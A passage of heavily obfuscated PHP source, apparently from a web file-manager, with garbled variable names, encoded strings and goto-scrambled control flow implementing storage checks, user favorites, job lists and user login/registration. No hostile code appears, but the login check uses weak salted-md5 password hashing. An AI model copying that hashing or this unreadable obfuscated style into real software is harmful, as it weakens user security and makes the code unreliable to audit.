exist($eƒ¶„İÙå») { return $this->isFile($eƒ¶„İÙå») || $this->isFolder($eƒ¶„İÙå»); } public function isFile($FŒêÄ–Ù·ƒ) { return !$this->isFolder($FŒêÄ–Ù·ƒ) && $this->objectMeta($FŒêÄ–Ù·ƒ); } public function isFolder($FÓÄ¡¸¸ŒÍ) { return $this->cacheMethod($_SERVER[«¾°Ã¤][199], $FÓÄ¡¸¸ŒÍ); } protected function objectMeta($A¼åê•Ü×á) { return $this->cacheMethod($_SERVER[«¾°Ã¤][200], $A¼åê•Ü×á); } protected function _objectMeta($f”ÒõìŠ‰ˆ) { $bâæšå¹à¬ =& $_SERVER[«¾°Ã¤]; try { $FâŞªíš = $this->client->getObjectMeta($this->bucket, $this->pathEncode($f”ÒõìŠ‰ˆ)); } catch (OSS\Core\OssException $F»¹ì¦Î¶‰) { $FâŞªíš = !1; } if ($FâŞªíš) { $FâŞªíš[$bâæšå¹à¬[78]] = intval($FâŞªíš[$bâæšå¹à¬[1276]]); } return $FâŞªíš; } protected function _isFolder($FÙ±‚ÇÎ) { $FË‡ù‘»¬ =& $_SERVER[«¾°Ã¤]; if ($FÙ±‚ÇÎ == $FË‡ù‘»¬[33] || $FÙ±‚ÇÎ == $FË‡ù‘»¬[8]) { return !0; } $b¢é‹Îô¸ = array($FË‡ù‘»¬[1272] => $FË‡ù‘»¬[8], $FË‡ù‘»¬[1273] => rtrim($FÙ±‚ÇÎ, $FË‡ù‘»¬[8]) . $FË‡ù‘»¬[8], $FË‡ù‘»¬[1274] => 1, $FË‡ù‘»¬[1275] => $FË‡ù‘»¬[33]); $fËªß§µÍ = $this->client->listObjects($this->bucket, $b¢é‹Îô¸); if ($fËªß§µÍ->getObjectList() || $fËªß§µÍ->getPrefixList()) { return !0; } return !1; } } goto e»ï‘¶»Ç‹; FÙ¿ÜîÙ: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($aª¦Âè˜Úµ) { $AÍù£ğ©ôÎ =& $_SERVER[«¾°Ã¤]; return array($AÍù£ğ©ôÎ[1795] => array(USER_ID, $AÍù£ğ©ôÎ[2114])); } protected function listData() { $CÌğ¬¢Ïİ =& $_SERVER[«¾°Ã¤]; $bÛ‚øÔ‹ = array($CÌğ¬¢Ïİ[1521] => USER_ID, $CÌğ¬¢Ïİ[472] => 0); $aÑï¹î£µ = $CÌğ¬¢Ïİ[2115]; $f‡¨ŠİİÅì = $this->field($aÑï¹î£µ)->where($bÛ‚øÔ‹)->order($CÌğ¬¢Ïİ[2116])->select(); return $f‡¨ŠİİÅì ? $f‡¨ŠİİÅì : array(); } protected function resetCache() { } protected function listView() { goto AŞÛ¢àğ×é; A¢‚íŸÄñ‚: $E©Şíë”áâ = array($F‚Üæšœåê[419] => array($F‚Üæšœåê[420], $A·½ìô™Ë)); $Eá×‚§Ï—§ = Model($F‚Üæšœåê[799])->listSource($E©Şíë”áâ, $dò£…‡ÍÅ¥); $Eá×‚§Ï—§ = array_merge($Eá×‚§Ï—§[$F‚Üæšœåê[74]], $Eá×‚§Ï—§[$F‚Üæšœåê[75]]); goto eÏò²Í£½¬; eÏò²Í£½¬: $Eá×‚§Ï—§ = array_to_keyvalue($Eá×‚§Ï—§, $F‚Üæšœåê[404]); foreach ($EŒŒÆ‹¡–Ú as $D•¤ÙëŒƒŒ => $f˜õ´è½Şš) { $fÎÈ©É…ÌÑ = $Eá×‚§Ï—§[$f˜õ´è½Şš[$F‚Üæšœåê[76]]]; $fÎÈ©É…ÌÑ = $fÎÈ©É…ÌÑ ? $fÎÈ©É…ÌÑ : array(); $EŒŒÆ‹¡–Ú[$D•¤ÙëŒƒŒ] = array_merge($fÎÈ©É…ÌÑ, $f˜õ´è½Şš); } return $EŒŒÆ‹¡–Ú; goto DÛ¾Ñ‘İöË; eèèöÂ’œ: $A·½ìô™Ë = array_to_keyvalue($bÀùì‡‡Í, $F‚Üæšœåê[33], $F‚Üæšœåê[76]); if (!$A·½ìô™Ë) { return $EŒŒÆ‹¡–Ú; } $dò£…‡ÍÅ¥ = 2000; goto A¢‚íŸÄñ‚; AŞÛ¢àğ×é: $F‚Üæšœåê =& $_SERVER[«¾°Ã¤]; $EŒŒÆ‹¡–Ú = $this->listData(); $bÀùì‡‡Í = array_filter_by_field($EŒŒÆ‹¡–Ú, $F‚Üæšœåê[29], $F‚Üæšœåê[418]); goto eèèöÂ’œ; DÛ¾Ñ‘İöË: } protected function addFav($b¨ÈéÖ§¥É, $F™–Ã‰ˆ = '', $bê‡ä¦ÈŸê = "\x73\157\x75\162\143\x65") { goto C¸Û™†Š‹Å; DĞÊ¢èåêÕ: return $this->add($D½õî„†—); goto f†§÷É¼Òå; c‹‚¥¸•Ù: $d¢µäí®§ = array($DöµÍñä°ë[1521] => USER_ID, $DöµÍñä°ë[472] => 0); $fƒ†ÅµÂ® = $this->where($d¢µäí®§)->max($DöµÍñä°ë[1716]); if (!$fƒ†ÅµÂ®) { $fƒ†ÅµÂ® = 0; } goto bÉˆÒò¾…Ô; bÉˆÒò¾…Ô: if (!$F™–Ã‰ˆ && $bê‡ä¦ÈŸê == $DöµÍñä°ë[418]) { $f¤¡óˆ£Ğ = Model($DöµÍñä°ë[1207])->where(array($DöµÍñä°ë[419] => $b¨ÈéÖ§¥É))->find(); if (!$f¤¡óˆ£Ğ) { return !1; } $F™–Ã‰ˆ = $f¤¡óˆ£Ğ[$DöµÍñä°ë[28]]; } $F™–Ã‰ˆ = $this->getAutoName($F™–Ã‰ˆ); $D½õî„†— = array($DöµÍñä°ë[1521] => USER_ID, $DöµÍñä°ë[472] => 0, $DöµÍñä°ë[422] => $F™–Ã‰ˆ, $DöµÍñä°ë[423] => $b¨ÈéÖ§¥É, $DöµÍñä°ë[424] => $bê‡ä¦ÈŸê, $DöµÍñä°ë[1697] => $fƒ†ÅµÂ® + 1); goto DĞÊ¢èåêÕ; C¸Û™†Š‹Å: $DöµÍñä°ë =& $_SERVER[«¾°Ã¤]; $d¢µäí®§ = array($DöµÍñä°ë[1521] => USER_ID, $DöµÍñä°ë[472] => 0, $DöµÍñä°ë[424] => $bê‡ä¦ÈŸê, $DöµÍñä°ë[423] => $b¨ÈéÖ§¥É); if ($this->where($d¢µäí®§)->find()) { return !1; } goto c‹‚¥¸•Ù; f†§÷É¼Òå: } protected function remove($c£¿İ¹—Ã) { $b²¢–¯•¹¡ =& $_SERVER[«¾°Ã¤]; $CàŸÔ”âªÎ = array($b²¢–¯•¹¡[1521] => USER_ID, $b²¢–¯•¹¡[421] => $c£¿İ¹—Ã); return $this->where($CàŸÔ”âªÎ)->delete(); } protected function removeByName($Aƒ‹Íì„Áè) { $A‡³ùğ¦Í« =& $_SERVER[«¾°Ã¤]; $E¶Öíèß Á = array($A‡³ùğ¦Í«[1521] => USER_ID, $A‡³ùğ¦Í«[422] => $Aƒ‹Íì„Áè, $A‡³ùğ¦Í«[472] => 0); return $this->where($E¶Öíèß Á)->delete(); } protected function rename($D†šÈÊÔ¦£, $EƒÉ¢‘»˜½) { $Dº¼±¦Ñğ =& $_SERVER[«¾°Ã¤]; if ($D†šÈÊÔ¦£ == $EƒÉ¢‘»˜½) { return !1; } $BØòñ©£è› = $this->getAutoName($EƒÉ¢‘»˜½); if ($EƒÉ¢‘»˜½ != $BØòñ©£è›) { return !1; } $bÜÎ–³¡“„ = array($Dº¼±¦Ñğ[1521] => USER_ID, $Dº¼±¦Ñğ[472] => 0, $Dº¼±¦Ñğ[28] => $D†šÈÊÔ¦£); return $this->where($bÜÎ–³¡“„)->save(array($Dº¼±¦Ñğ[28] => $EƒÉ¢‘»˜½)); } protected function resetSort($a†ò÷ãÏ¶) { $e÷¯‹–÷îË =& $_SERVER[«¾°Ã¤]; $a†ò÷ãÏ¶ = is_array($a†ò÷ãÏ¶) ? $a†ò÷ãÏ¶ : array(); $c¤¹¶äÏß = array($e÷¯‹–÷îË[1521] => USER_ID); for ($EÙÓéƒî = 0; $EÙÓéƒî < count($a†ò÷ãÏ¶); $EÙÓéƒî++) { $c¤¹¶äÏß[$e÷¯‹–÷îË[421]] = $a†ò÷ãÏ¶[$EÙÓéƒî]; $this->where($c¤¹¶äÏß)->save(array($e÷¯‹–÷îË[1697] => $EÙÓéƒî + 1)); } return !0; } protected function moveTop($aÇ¤Üî‚öù) { goto c…ƒÕ•‡ ¶; a…™µ²íí: if (!$bê¼»ß¹Ä) { return; } $e—äÙÇ¾ƒ‡ = $this->field($DŠÖµÆÉÍ¿[393])->where($FŸ¦íÚİ)->order($DŠÖµÆÉÍ¿[2116])->select(); $e—äÙÇ¾ƒ‡ = array_to_keyvalue($e—äÙÇ¾ƒ‡, $DŠÖµÆÉÍ¿[33], $DŠÖµÆÉÍ¿[393]); goto b´ÃÜàèÒŒ; aøùã‚Ô¨±: return $this->resetSort($e—äÙÇ¾ƒ‡); goto A¿äŞ´¾‘ö; b´ÃÜàèÒŒ: $eõÈòáÌ°„ = $e—äÙÇ¾ƒ‡; $e—äÙÇ¾ƒ‡ = array_remove_value($e—äÙÇ¾ƒ‡, $bê¼»ß¹Ä[$DŠÖµÆÉÍ¿[393]]); array_unshift($e—äÙÇ¾ƒ‡, $bê¼»ß¹Ä[$DŠÖµÆÉÍ¿[393]]); goto aøùã‚Ô¨±; c…ƒÕ•‡ ¶: $DŠÖµÆÉÍ¿ =& $_SERVER[«¾°Ã¤]; $FŸ¦íÚİ = array($DŠÖµÆÉÍ¿[1521] => USER_ID, $DŠÖµÆÉÍ¿[472] => 0); $bê¼»ß¹Ä = $this->where($FŸ¦íÚİ)->where(array($DŠÖµÆÉÍ¿[28] => $aÇ¤Üî‚öù))->find(); goto a…™µ²íí; A¿äŞ´¾‘ö: } protected function moveBottom($EªÀğ‘ïÚ) { $F×åÀö… =& $_SERVER[«¾°Ã¤]; $AÄ‚”Ï´Ã = array($F×åÀö…[1521] => USER_ID, $F×åÀö…[472] => 0); $bˆÔÔšÆÙ = $this->where($AÄ‚”Ï´Ã)->max($F×åÀö…[1716]); $cšç¶ë–¥² = array($F×åÀö…[1716] => $bˆÔÔšÆÙ + 1); return $this->where($AÄ‚”Ï´Ã)->where(array($F×åÀö…[28] => $EªÀğ‘ïÚ))->save($cšç¶ë–¥²); } private function getAutoName($fÙÒßÃà•Ë) { goto dñª‹ÎóÍ´; e…î°õö±: $fšÆêàÜÀ = array_to_keyvalue($fšÆêàÜÀ, $Dø©×¯ªˆ‚[33], $Dø©×¯ªˆ‚[28]); if (!$fšÆêàÜÀ || !in_array($fÙÒßÃà•Ë, $fšÆêàÜÀ)) { return $fÙÒßÃà•Ë; } for ($cÙÀƒë¤·µ = 0; $cÙÀƒë¤·µ < count($fšÆêàÜÀ); $cÙÀƒë¤·µ++) { if (!in_array($fÙÒßÃà•Ë . "\50{$cÙÀƒë¤·µ}\x29", $fšÆêàÜÀ)) { return $fÙÒßÃà•Ë . "\50{$cÙÀƒë¤·µ}\51"; } } goto F®Ôâ¦äÂ½; F®Ôâ¦äÂ½: return $fÙÒßÃà•Ë . "\x28{$cÙÀƒë¤·µ}\x29"; goto d»ÜÃ’„; dñª‹ÎóÍ´: $Dø©×¯ªˆ‚ =& $_SERVER[«¾°Ã¤]; $Dã×İàÓœÖ = array($Dø©×¯ªˆ‚[1521] => USER_ID, $Dø©×¯ªˆ‚[472] => 0); $fšÆêàÜÀ = $this->field($Dø©×¯ªˆ‚[28])->where($Dã×İàÓœÖ)->select(); goto e…î°õö±; d»ÜÃ’„: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\152\157\x62\x4c\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\x64\x65\x73\x63", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\x65\x6c\146\x4a\x6f\142\x4c\151\163\164"; public function listData($AÒ×®à‡ ¦ = false, $eéƒ¡Ú…ŒŒ = "\163\157\162\x74", $E—Á‘“çø = false) { return parent::listData($AÒ×®à‡ ¦, $eéƒ¡Ú…ŒŒ, $E—Á‘“çø); } public function remove($AĞáö‰êä‹) { return parent::remove($AĞáö‰êä‹); } public function add($Eá¬ö¢êÇÇ) { $AÄÇí©ªøø =& $_SERVER[«¾°Ã¤]; if ($this->findByName($Eá¬ö¢êÇÇ[$AÄÇí©ªøø[28]])) { return !1; } $Eá¬ö¢êÇÇ[$AÄÇí©ªøø[1716]] = $this->getSort(); return parent::insert($Eá¬ö¢êÇÇ); } private function getSort() { $EïĞ–É’‹¶ =& $_SERVER[«¾°Ã¤]; $A¡§Øˆ­¯ = parent::listData(); $A’«âğ©‚Í = array_to_keyvalue($A¡§Øˆ­¯, $EïĞ–É’‹¶[33], $EïĞ–É’‹¶[1716]); return empty($A’«âğ©‚Í) ? 0 : max($A’«âğ©‚Í) + 1; } public function update($Eâ‚˜¿Ç†ô, $eò‰…ò¼âÊ) { $E¥­¾ˆ¯‹ =& $_SERVER[«¾°Ã¤]; $eì¯¥Š“Ëí = parent::listData($Eâ‚˜¿Ç†ô); $FŠÑ²îŠĞ¹ = $this->findByName($eò‰…ò¼âÊ[$E¥­¾ˆ¯‹[28]]); if (!$eì¯¥Š“Ëí || $FŠÑ²îŠĞ¹ && $FŠÑ²îŠĞ¹[$E¥­¾ˆ¯‹[393]] != $eì¯¥Š“Ëí[$E¥­¾ˆ¯‹[393]]) { return !1; } return parent::update($Eâ‚˜¿Ç†ô, $eò‰…ò¼âÊ); } public function setUserJob($DÄÎõöèá‹, $eâƒåšÜ‘Ÿ) { goto C¥‚ßÄÁ‚…; C¥‚ßÄÁ‚…: $D•æ­°°„Û =& $_SERVER[«¾°Ã¤]; if (!is_array($eâƒåšÜ‘Ÿ)) { $eâƒåšÜ‘Ÿ = array($eâƒåšÜ‘Ÿ); } $A™‚¯œ–„Æ = parent::listData(); goto fœŞùºÒ¦×; DéÈùÌĞ¾: $b¨‡ÙÃç = rtrim($b¨‡ÙÃç, $D•æ­°°„Û[47]); Model($D•æ­°°„Û[515])->metaSet($DÄÎõöèá‹, self::JOB_KEY, $b¨‡ÙÃç); goto A•ƒ¬²®óÛ; fœŞùºÒ¦×: $f‰è´Ëó˜ = array_to_keyvalue($A™‚¯œ–„Æ, $D•æ­°°„Û[28]); $b¨‡ÙÃç = $D•æ­°°„Û[375]; foreach ($eâƒåšÜ‘Ÿ as $BÀ‡®„‘‘â) { if ($f‰è´Ëó˜[$BÀ‡®„‘‘â]) { $b¨‡ÙÃç .= $f‰è´Ëó˜[$BÀ‡®„‘‘â][$D•æ­°°„Û[393]] . $D•æ­°°„Û[47]; } else { $EåĞÆÊƒ„Å = $this->add($BÀ‡®„‘‘â); $b¨‡ÙÃç .= $EåĞÆÊƒ„Å . $D•æ­°°„Û[47]; } } goto DéÈùÌĞ¾; A•ƒ¬²®óÛ: } public function getUserJob($A½ÆĞ ÆÄÃ) { $aÔ…íÂ¥© = Model($_SERVER[«¾°Ã¤][515])->metaGet($A½ÆĞ ÆÄÃ); return $this->getUserJobInfo($aÔ…íÂ¥©[self::JOB_KEY]); } public function getUserJobInfo($Dî˜œ”õİ) { goto C¹¢èŒÚ°; AÕ¼Õ­·¢: return $EáëÛùÑƒÒ; goto f¥‘ÇØ¶; C¹¢èŒÚ°: $d¼‘ÍÖÉÅ =& $_SERVER[«¾°Ã¤]; $fóéåğŒ¤á = explode($d¼‘ÍÖÉÅ[47], $Dî˜œ”õİ); $b˜Üæ šËÀ = parent::listData(); goto Eê›Œ‚’İÈ; Eê›Œ‚’İÈ: $b˜Üæ šËÀ = array_remove_key($b˜Üæ šËÀ, $d¼‘ÍÖÉÅ[194]); $EáëÛùÑƒÒ = array(); foreach ($fóéåğŒ¤á as $b¬Ş§ã‰ô) { if (isset($b˜Üæ šËÀ[$b¬Ş§ã‰ô])) { $EáëÛùÑƒÒ[] = $b˜Üæ šËÀ[$b¬Ş§ã‰ô]; } } goto AÕ¼Õ­·¢; f¥‘ÇØ¶: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\141\x6d\x65" => "\x75\x73\x65\x72\x5f\x6d\x65\x74\141", "\x6d\145\x74\x61\x46\x69\145\154\x64" => "\x75\x73\x65\x72\111\104"); protected $simpleField = "\x75\163\145\x72\x49\104\54\156\x69\x63\x6b\116\x61\155\x65\x2c\156\x61\155\145\54\x61\x76\141\164\x61\x72\x2c\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($CÒˆÛº†×) { $A¶Î«­ĞŠÌ =& $_SERVER[«¾°Ã¤]; $EŸ…ˆË™Òğ = $A¶Î«­ĞŠÌ[2117]; return array($A¶Î«­ĞŠÌ[1763] => array($CÒˆÛº†×[0], $EŸ…ˆË™Òğ), $A¶Î«­ĞŠÌ[1765] => array($CÒˆÛº†×[0], $EŸ…ˆË™Òğ), $A¶Î«­ĞŠÌ[2118] => array($CÒˆÛº†×[0], $EŸ…ˆË™Òğ)); } protected function getInfo($A¶¸‰‹¶–, $aÛ½ğŞø = false) { $cÂ˜‚ÅÜ‹ = $this->getInfoSimple($A¶¸‰‹¶–); if (!is_array($cÂ˜‚ÅÜ‹)) { return array(); } if ($aÛ½ğŞø) { return $this->_getInfoApply($cÂ˜‚ÅÜ‹); } return $this->cacheFunctionGet($_SERVER[«¾°Ã¤][1772], $A¶¸‰‹¶–); } protected function getInfoFull($a¬Ëó¥ìì‚, $D–Åå¾§Ÿ… = false) { $F†…Ò¯Ï²† = $this->getInfoSimple($a¬Ëó¥ìì‚); if (!is_array($F†…Ò¯Ï²†)) { return array(); } if ($D–Åå¾§Ÿ…) { return $this->_getInfoApply($F†…Ò¯Ï²†, !0); return $this->_getInfoApply($F†…Ò¯Ï²†, !0); } return $this->cacheFunctionGet($_SERVER[«¾°Ã¤][2119], $a¬Ëó¥ìì‚); } private function _getInfoApply($c…×˜ÈĞ›, $Bö„ËùÚÏ‰ = false) { goto B®¥­ÁÜ¬; b‡¸İŒÜãÔ: $c…×˜ÈĞ› = $this->_listDataApplyItem($c…×˜ÈĞ›); $AŞİµÄË…Æ = Model($E ‰Ï¶³°¥[1207])->metaGet($c…×˜ÈĞ›[$E ‰Ï¶³°¥[85]][$E ‰Ï¶³°¥[404]]); $c…×˜ÈĞ›[$E ‰Ï¶³°¥[2122]] = $a¬ÜÊ‰ŒõŒ; goto b–¾ğƒ‚·; b–¾ğƒ‚·: $c…×˜ÈĞ›[$E ‰Ï¶³°¥[85]][$E ‰Ï¶³°¥[1953]] = isset($AŞİµÄË…Æ[$E ‰Ï¶³°¥[1954]]) ? $AŞİµÄË…Æ[$E ‰Ï¶³°¥[1954]] : null; if ($Bö„ËùÚÏ‰) { $c…×˜ÈĞ›[$E ‰Ï¶³°¥[454]] = $this->metaGet($c…×˜ÈĞ›[$E ‰Ï¶³°¥[1529]]); } return $c…×˜ÈĞ›; goto EÌªäˆÌæ; B®¥­ÁÜ¬: $E ‰Ï¶³°¥ =& $_SERVER[«¾°Ã¤]; if (!$c…×˜ÈĞ›) { return $c…×˜ÈĞ›; } $a¬ÜÊ‰ŒõŒ = md5($E ‰Ï¶³°¥[2120] . $c…×˜ÈĞ›[$E ‰Ï¶³°¥[850]] . $E ‰Ï¶³°¥[2121] . $c…×˜ÈĞ›[$E ‰Ï¶³°¥[28]]); goto b‡¸İŒÜãÔ; EÌªäˆÌæ: } protected function getInfoSimple($aïğâé¥Ï, $Føõ±ö¡Õ = false) { $dª¹ä®’œŠ =& $_SERVER[«¾°Ã¤]; if (!$aïğâé¥Ï) { return array(); } if ($Føõ±ö¡Õ) { $B‰Ù£˜†¥ï = $this->where(array($dª¹ä®’œŠ[1529] => intval($aïğâé¥Ï)))->find(); if (!is_array($B‰Ù£˜†¥ï)) { return array(); } $B‰Ù£˜†¥ï[$dª¹ä®’œŠ[2123]] = Action($dª¹ä®’œŠ[2124])->parseUrl($B‰Ù£˜†¥ï[$dª¹ä®’œŠ[2123]]); return $B‰Ù£˜†¥ï; } return $this->cacheFunctionGet($dª¹ä®’œŠ[1766], $aïğâé¥Ï); } protected function getInfoSimpleOuter($FîñãºÓÛÎ) { goto EÃä’¼¨‘ø; EÃä’¼¨‘ø: $Aô£Îƒåæå =& $_SERVER[«¾°Ã¤]; if (!$FîñãºÓÛÎ || $FîñãºÓÛÎ == 0) { return array($Aô£Îƒåæå[1529] => $Aô£Îƒåæå[191], $Aô£Îƒåæå[28] => $Aô£Îƒåæå[160] . LNG($Aô£Îƒåæå[2125]) . $Aô£Îƒåæå[513], $Aô£Îƒåæå[2123] => STATIC_PATH . $Aô£Îƒåæå[2126]); } $c©×øŸ´ = $this->cacheFunctionGet($Aô£Îƒåæå[1766], $FîñãºÓÛÎ); goto föÁ´‘“‘Í; föÁ´‘“‘Í: $CÆ’‚ˆèéÛ = array_field_key($c©×øŸ´, explode($Aô£Îƒåæå[47], $this->simpleField)); if (!$CÆ’‚ˆèéÛ) { return array($Aô£Îƒåæå[1529] => $Aô£Îƒåæå[1086], $Aô£Îƒåæå[28] => $Aô£Îƒåæå[160] . LNG($Aô£Îƒåæå[2127]) . $Aô£Îƒåæå[513], $Aô£Îƒåæå[2123] => STATIC_PATH . $Aô£Îƒåæå[2128]); } $CÆ’‚ˆèéÛ[$Aô£Îƒåæå[2123]] = Action($Aô£Îƒåæå[2124])->parseUrl($CÆ’‚ˆèéÛ[$Aô£Îƒåæå[2123]]); goto D·ä”´‚‘Ò; D·ä”´‚‘Ò: return $CÆ’‚ˆèéÛ; goto B¼Ñ¼Ú¾ˆ¦; B¼Ñ¼Ú¾ˆ¦: } protected function groupUser($C˜” Ø‚é) { } public static function errorLang($F©ì˜í½“ò) { $a“ÀøŞŸøÜ =& $_SERVER[«¾°Ã¤]; $fÓŸÄ£Šˆ¢ = array(self::ERROR_USER_NOT_EXISTS => $a“ÀøŞŸøÜ[2129], self::ERROR_USER_PASSWORD_ERROR => $a“ÀøŞŸøÜ[2130], self::ERROR_USER_EXIST_NAME => $a“ÀøŞŸøÜ[2131], self::ERROR_USER_EXIST_PHONE => $a“ÀøŞŸøÜ[2132], self::ERROR_USER_EXIST_EMAIL => $a“ÀøŞŸøÜ[2133], self::ERROR_USER_LOGIN_LOCK => $a“ÀøŞŸøÜ[2134], self::ERROR_IP_NOT_ALLOW => $a“ÀøŞŸøÜ[2135], self::ERROR_USER_EXIST_NICKNAME => $a“ÀøŞŸøÜ[2136]); return LNG($fÓŸÄ£Šˆ¢[$F©ì˜í½“ò]); } public function getInfoByMeta($eŸ›‹ê¡­, $cí‘Ú‘…ÄŠ) { $Cº¶òˆ’å” =& $_SERVER[«¾°Ã¤]; $FˆÅ’ùµ· = Model($Cº¶òˆ’å”[2137])->where(array($Cº¶òˆ’å”[93] => $eŸ›‹ê¡­, $Cº¶òˆ’å”[372] => $cí‘Ú‘…ÄŠ))->find(); if ($FˆÅ’ùµ·) { return $this->getInfo($FˆÅ’ùµ·[$Cº¶òˆ’å”[1529]]); } return !1; } public function userLoginCheck($eƒìíŒ‰ÔÏ, $D–ù£ñ“¢ù) { $C›¶˜š°ãÃ =& $_SERVER[«¾°Ã¤]; $AùØ±”Ì¯ = $this->userLoginFind($eƒìíŒ‰ÔÏ); if (!$AùØ±”Ì¯) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($AùØ±”Ì¯[$C›¶˜š°ãÃ[1529]], $D–ù£ñ“¢ù)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($AùØ±”Ì¯[$C›¶˜š°ãÃ[1529]]); } public function userLoginFind($D­¯ãŞë) { $a«å£«‡¯ =& $_SERVER[«¾°Ã¤]; $Bš®¶¥í„ = array($a«å£«‡¯[28] => $D­¯ãŞë, $a«å£«‡¯[1957] => $D­¯ãŞë, $a«å£«‡¯[303] => $D­¯ãŞë, $a«å£«‡¯[2138] => $D­¯ãŞë, $a«å£«‡¯[958] => $a«å£«‡¯[960]); if ($this->nickNameRpt()) { unset($Bš®¶¥í„[$a«å£«‡¯[1957]]); } return $this->where($Bš®¶¥í„)->find(); } public function clearCache($B–Ÿ‡êˆ¤µ) { $d†ŒµÚ²º¡ =& $_SERVER[«¾°Ã¤]; $this->cacheFunctionClear($d†ŒµÚ²º¡[1772], $B–Ÿ‡êˆ¤µ); $this->cacheFunctionClear($d†ŒµÚ²º¡[1766], $B–Ÿ‡êˆ¤µ); $this->cacheFunctionClear($d†ŒµÚ²º¡[2119], $B–Ÿ‡êˆ¤µ); } public function userPasswordCheck($A«‘—ê©î, $DùÈëéÅ‚ç) { $FŞ¡±… ÜÈ =& $_SERVER[«¾°Ã¤]; $AÂÔ°ñšš¡ = $this->where(array($FŞ¡±… ÜÈ[1529] => intval($A«‘—ê©î)))->find(); $e—®áÆùªØ = $this->metaGet($A«‘—ê©î); $bå‹íáêŠÀ = isset($e—®áÆùªØ[$FŞ¡±… ÜÈ[2139]]) ? $e—®áÆùªØ[$FŞ¡±… ÜÈ[2139]] : $FŞ¡±… ÜÈ[33]; if (md5($bå‹íáêŠÀ . trim($DùÈëéÅ‚ç)) !== $AÂÔ°ñšš¡[$FŞ¡±… ÜÈ[850]]) { return !1; } return !0; } public function userAdd($D£ô›º“¯–) { goto d¾–‘Ø¬Í; a¹²åãò÷ä: $EôÃ¹ŠÉÓ = $this->_checkExist($D£ô›º“¯–); if ($EôÃ¹ŠÉÓ !== !0) { return $EôÃ¹ŠÉÓ; } $BËÕ“†¸¿ = $this->add($a»Î†óŠÌÚ); goto cŸÒæÑìº¹; d¾–‘Ø¬Í: $c‡ùÈš³à½ =& $_SERVER[«¾°Ã¤]; $a»Î†óŠÌÚ = array($c‡ùÈš³à½[422] => $D£ô›º“¯–[$c‡ùÈš³à½[28]], $c‡ùÈš³à½[2140] => $D£ô›º“¯–[$c‡ùÈš³à½[1413]], $c‡ùÈš³à½[2141] => isset($D£ô›º“¯–[$c‡ùÈš³à½[303]]) ? $D£ô›º“¯–[$c‡ùÈš³à½[303]] : $c‡ùÈš³à½[33], $c‡ùÈš³à½[2142] => isset($D£ô›º“¯–[$c‡ùÈš³à½[2138]]) ? $D£ô›º“¯–[$c‡ùÈš³à½[2138]] : $c‡ùÈš³à½[33], $c‡ùÈš³à½[2143] => isset($D£ô›º“¯–[$c‡ùÈš³à½[1957]]) ? $D£ô›º“¯–[$c‡ùÈš³à½[1957]] : $D£ô›º“¯–[$c‡ùÈš³à½[28]], $c‡ùÈš³à½[2144] => isset($D£ô›º“¯–[$c‡ùÈš³à½[2123]]) ? $D£ô›º“¯–[$c‡ùÈš³à½[2123]] : $c‡ùÈš³à½[33], $c‡ùÈš³à½[2145] => isset($D£ô›º“¯–[$c‡ùÈš³à½[2146]]) ? $D£ô›º“¯–[$c‡ùÈš³à½[2146]] : 1, $c‡ùÈš³à½[2147] => $D£ô›º“¯–[$c‡ùÈš³à½[850]], $c‡ùÈš³à½[1767] => isset($D£ô›º“¯–[$c‡ùÈš³à½[1677]]) ? $D£ô›º“¯–[$c‡ùÈš³à½[1677]] : 1024 * 1024 * 20, $c‡ùÈš³à½[1768] => 0, $c‡ùÈš³à½[2148] => 0, $c‡ùÈš³à½[1811] => isset($D£ô›º“¯–[$c‡ùÈš³à½[719]]) ? $D£ô›º“¯–[$c‡ùÈš³à½[719]] : 1); if (!empty($D£ô›º“¯–[$c‡ùÈš³à½[1529]])) { $a»Î†óŠÌÚ[$c‡ùÈš³à½[1529]] = $D£ô›º“¯–[$c‡ùÈš³à½[1529]]; } goto a¹²åãò÷ä; bõ¯ŞËÍ¾: return $BËÕ“†¸¿; goto eİÜ‡æè; cŸÒæÑìº¹: $BİĞ­‰¬ = array($c‡ùÈš³à½[2147] => $a»Î†óŠÌÚ[$c‡ùÈš³à½[850]], $c‡ùÈš³à½[2143] => $a»Î†óŠÌÚ[$c‡ùÈš³à½[1957]]); $this->userEdit($BËÕ“†¸¿, $BİĞ­‰¬); Model($c‡ùÈš³à½[1207])->userRootAdd($BËÕ“†¸¿); goto bõ¯ŞËÍ¾; eİÜ‡æè: } protected function userEditTest($eÇ‡ÍØÑâë, $dë©ùêİ) { return $this->call($_SERVER[«¾°Ã¤][2149], $eÇ‡ÍØÑâë, $dë©ùêİ); } protected function userEdit($dÖ…”öëŞã, $eõ·ÏğÆîî) { goto BÑ„÷’Ü¾; BÑ„÷’Ü¾: $Cùò»ŸÒ³ =& $_SERVER[«¾°Ã¤]; $bÚè•÷¢òÙ = $this->getInfoSimple($dÖ…”öëŞã); if (!$bÚè•÷¢òÙ) { return !1; } goto BÄã¼õ•Ã; BÄã¼õ•Ã: $aÃÜ¸•š–Ã = $this->_checkExist($eõ·ÏğÆîî, $dÖ…”öëŞã); if ($aÃÜ¸•š–Ã !== !0) { return $aÃÜ¸•š–Ã; } if (isset($eõ·ÏğÆîî[$Cùò»ŸÒ³[850]]) && trim($eõ·ÏğÆîî[$Cùò»ŸÒ³[850]]) != $Cùò»ŸÒ³[33]) { $D‰åèÓÒ«Ø = $this->metaGet($dÖ…”öëŞã); if (empty($D‰åèÓÒ«Ø[$Cùò»ŸÒ³[2139]])) { $D‰åèÓÒ«Ø[$Cùò»ŸÒ³[2139]] = rand_string(10); Model($Cùò»ŸÒ³[511])->metaSet($dÖ…”öëŞã, $Cùò»ŸÒ³[2139], $D‰åèÓÒ«Ø[$Cùò»ŸÒ³[2139]]); 